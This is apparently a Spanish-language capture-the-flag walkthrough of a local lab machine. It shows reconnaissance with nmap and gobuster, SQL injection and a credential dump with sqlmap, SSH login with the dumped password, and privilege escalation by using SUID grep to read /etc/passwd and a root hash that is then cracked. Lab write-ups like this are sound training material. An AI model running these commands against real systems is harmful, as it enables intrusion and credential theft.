```bash
nmap -sV -O -sC -p- 172.17.0.2
```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
| ssh-hostkey:    
|   256 08:ba:95:95:10:20:1e:54:19:c3:33:a8:75:dd:f8:4d (ECDSA)  
|_  256 1e:22:63:40:c9:b9:c5:6f:c2:09:29:84:6f:e7:0b:76 (ED25519)  
80/tcp open  http    Apache httpd 2.4.61 ((Debian))  
|_http-server-header: Apache/2.4.61 (Debian)  
|_http-title: test page

buscamos directorios:
```bash
gobuster dir -w /home/eduard/wordList/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.17.0.2

/css                  (Status: 301) [Size: 306] [--> http://172.17.0.2/css/]  
/server-status        (Status: 403) [Size: 275]
```

dentro del indice de la  pagina, encontramos un login. comprobamos si es vulnerable a sql injection
```
user
'
```

```bash
**Fatal error**: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in /var/www/html/login.php:26 Stack trace: #0 /var/www/html/login.php(26): mysqli->query() #1 {main} thrown in **/var/www/html/login.php** on line **26**
```
vamos a usar sqlmap:
```bash
sqlmap -u http://172.17.0.2/login.html --forms --dbs -batch

available databases [5]:  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] sys  
[*] users
```

para ver el contenido:

```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users --tables -batch

Database: users  
[1 table]  
+----------+  
| usuarios |  
+----------+
```

vamos a ver el contenido de esa tabla
```bash
sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios -columns -batch


Table: usuarios  
[3 columns]  
+----------+--------------+  
| Column   | Type         |  
+----------+--------------+  
| id       | int(11)      |  
| password | varchar(255) |  
| username | varchar(255) |  
+----------+--------------+


sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios -C id,username,password -dump -batch

Database: users  
Table: usuarios  
[3 entries]  
+----+----------+---------------+  
| id | username | password      |  
+----+----------+---------------+  
| 1  | paco     | $paco$123     |  
| 2  | pepe     | P123pepe3456P |  
| 3  | juan     | jjuuaann123   |  
+----+----------+---------------+
```
ya tenemos usuarios y contraseña. Vamos a intentar entrar via ssh
Solo permite entrar con pepe
```bash
ssh pepe@172.17.0.2
# P123pepe3456P
```

escalada de privilegios
```bash
find / -perm -4000 2>/dev/null    

/usr/bin/chfn  
/usr/bin/chsh  
/usr/bin/gpasswd  
/usr/bin/grep  
/usr/bin/ls  
/usr/bin/mount  
/usr/bin/newgrp  
/usr/bin/passwd  
/usr/bin/su  
/usr/bin/umount
```
llama la intención grep y ls

```bash
pepe@4949c1625ffe:/$ ls root  
pass.hash
```
podemos ver que dentro del directorio root hay un archivo interesante
vamos a ver el contenido con grep

```bash
grep '' /etc/passwd 

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false  
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin  
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin  
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin  
pepe:x:1000:1000::/home/pepe:/bin/bash
```

```bash
grep '' /root/pass.hash  
e43833c4c9d5ac444e16bb94715a75e4
```
parece ser el hash de root

usamos hashidentifier para saber el tipo de hash

```bash
Possible Hashs:  
[+] MD5
```

vamos a usar https://www.md5online.org/md5-decrypt.html#google_vignette para desencriptarlo

y la contraseña es `spongebob34`

ahora vamos a usarla para convertirnos en root
```bash
su -
spongebob34

whoami
# root
```